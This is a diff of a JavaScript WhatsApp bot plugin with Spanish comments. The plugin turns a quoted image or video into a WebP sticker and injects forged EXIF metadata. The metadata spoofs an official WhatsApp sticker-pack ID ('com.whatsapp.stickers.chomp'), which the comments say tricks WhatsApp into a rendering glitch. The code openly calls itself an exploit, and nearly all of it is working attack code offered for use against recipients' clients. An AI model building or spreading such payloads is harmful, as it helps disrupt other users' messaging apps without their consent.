@@ -1,19 +1,22 @@
-// plugins/sticker_glitch.js
-const fs = require('fs');
-const { exec } = require('child_process');
-const util = require('util');
+import fs from 'fs';
+import { exec } from 'child_process';
+import util from 'util';
+import path from 'path';
+
 const execPromise = util.promisify(exec);
 
-// Generador del Payload EXIF falso
+/**
+ * Crea metadatos Exif específicos para el exploit "Chomp"
+ * Este ID engaña a WhatsApp para que use el renderizador de un paquete oficial
+ */
 const createSpoofedExif = (packname, author) => {
     const json = {
-        "sticker-pack-id": "com.whatsapp.stickers.chomp", // ID oficial spoofed
+        "sticker-pack-id": "com.whatsapp.stickers.chomp",
         "sticker-pack-name": packname,
         "sticker-pack-publisher": author,
-        "emojis": ["💀", "💥"]
+        "emojis": ["💀"]
     };
     const jsonStr = JSON.stringify(json);
-    // Cabecera estándar EXIF para WebP en WhatsApp
     const exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00]);
     const jsonBuff = Buffer.from(jsonStr, 'utf-8');
     const exif = Buffer.concat([exifAttr, jsonBuff, Buffer.from([0x00])]);
@@ -21,23 +24,30 @@ const createSpoofedExif = (packname, author) => {
     return exif;
 };
 
-module.exports = {
+export default {
     name: 'sticker_glitch',
-    match: (text, { quoted, getMediaInfo }) => text.toLowerCase() === 'sg' && quoted && getMediaInfo(quoted),
-    execute: async ({ sock, remitente, quoted, getMediaInfo, downloadContentFromMessage }) => {
-        const mediaInfo = getMediaInfo(quoted);
-        if (mediaInfo.type !== 'image' && mediaInfo.type !== 'video') return;
+    // Comando 'sg' (Sticker Glitch)
+    match: (text, { quoted, getMediaInfo }) => text.toLowerCase() === '.sg' && quoted && getMediaInfo(quoted),
 
-        let statusMsg = await sock.sendMessage(remitente, { text: "⏳ Forzando exploit Chomp en el servidor..." });
+    execute: async ({ sock, remitente, msg, quoted, getMediaInfo, downloadContentFromMessage }) => {
+        const mediaInfo = getMediaInfo(quoted);
+        if (mediaInfo.type !== 'image' && mediaInfo.type !== 'video') {
+            return sock.sendMessage(remitente, { text: "❌ Responde a una imagen o video corto." });
+        }
+
+        const statusMsg = await sock.sendMessage(remitente, { text: "⏳ Inyectando exploit en metadatos..." }, { quoted: msg });
         
         const idStr = Date.now().toString();
-        const inputPath = `temp_in_${idStr}`;
-        const tempWebpPath = `temp_raw_${idStr}.webp`;
-        const exifPath = `temp_exif_${idStr}.exif`;
-        const outputPath = `temp_out_${idStr}.webp`;
+        const inputPath = `./tmp/in_${idStr}`;
+        const tempWebpPath = `./tmp/raw_${idStr}.webp`;
+        const exifPath = `./tmp/exif_${idStr}.exif`;
+        const outputPath = `./tmp/out_${idStr}.webp`;
+
+        // Asegurar que existe carpeta tmp
+        if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp');
 
         try {
-            // 1. Descargar media
+            // Descarga de media
             const stream = await downloadContentFromMessage(mediaInfo.msg, mediaInfo.type);
             let buffer = Buffer.from([]);
             for await(const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
@@ -45,36 +55,39 @@ module.exports = {
 
             const isVideo = mediaInfo.type === 'video';
             
-            // 2. Convertir a WebP SIN escalar (mantiene la resolución masiva original) y con alta calidad
+            /**
+             * IMPORTANTE: Para que el glitch se vea como en el video, 
+             * forzamos dimensiones no estándar y una escala de 512:-1
+             */
+            const ffmpegPath = process.platform === 'win32' ? './ffmpeg.exe' : './ffmpeg';
+            const webpmuxPath = process.platform === 'win32' ? './webpmux.exe' : './webpmux';
+
             const cmdFfmpeg = isVideo 
-                ? `ffmpeg -i "${inputPath}" -vcodec libwebp -lossless 0 -compression_level 4 -q:v 85 -loop 0 -preset picture -an -t 5 "${tempWebpPath}" -y`
-                : `ffmpeg -i "${inputPath}" -vcodec libwebp -lossless 0 -compression_level 4 -q:v 85 -preset picture -an "${tempWebpPath}" -y`;
+                ? `${ffmpegPath} -i "${inputPath}" -vcodec libwebp -filter:v "fps=15,scale=512:-1:flags=lanczos" -lossless 0 -compression_level 6 -q:v 70 -loop 0 -preset picture -an -t 6 "${tempWebpPath}" -y`
+                : `${ffmpegPath} -i "${inputPath}" -vcodec libwebp -filter:v "scale=512:-1:flags=lanczos" -lossless 0 -compression_level 6 -q:v 85 -preset picture -an "${tempWebpPath}" -y`;
 
             await execPromise(cmdFfmpeg);
 
-            // 3. Crear el archivo EXIF con la metadata falsa
-            fs.writeFileSync(exifPath, createSpoofedExif("Chomp", "whatsapp plus"));
+            // Crear e inyectar EXIF
+            fs.writeFileSync(exifPath, createSpoofedExif("Chomp Glitch", "Gemini Bot"));
 
-            // 4. Inyectar el EXIF en el WebP usando webpmux
-            try {
-                await execPromise(`webpmux -set exif "${exifPath}" "${tempWebpPath}" -o "${outputPath}"`);
-            } catch (muxError) {
-                console.error("Fallo crítico: webpmux no está instalado en el sistema. Enviando versión sin inyectar.", muxError);
-                // Fallback por si no instalaste 'webp' en el SO, aunque el glitch requerirá el EXIF
-                fs.renameSync(tempWebpPath, outputPath);
-            }
+            // Uso de webpmux local
+            await execPromise(`${webpmuxPath} -set exif "${exifPath}" "${tempWebpPath}" -o "${outputPath}"`);
 
-            // 5. Enviar el payload final
-            await sock.sendMessage(remitente, { sticker: { url: outputPath } });
+            // Enviar Sticker
+            await sock.sendMessage(remitente, { 
+                sticker: fs.readFileSync(outputPath) 
+            }, { quoted: msg });
+
             await sock.sendMessage(remitente, { delete: statusMsg.key });
 
         } catch (err) {
-            console.error("Error en la generación:", err);
-            await sock.sendMessage(remitente, { text: "❌ Fallo al procesar el exploit." });
+            console.error("Error Glitch Sticker:", err);
+            await sock.sendMessage(remitente, { text: `❌ Error: Verifica que './ffmpeg' y './webpmux' estén en la raíz.` });
         } finally {
-            // Limpieza de rastros
+            // Limpieza ruda de archivos temporales
             [inputPath, tempWebpPath, exifPath, outputPath].forEach(file => {
-                if (fs.existsSync(file)) fs.unlinkSync(file);
+                if (fs.existsSync(file)) try { fs.unlinkSync(file); } catch(e) {}
             });
         }
     }
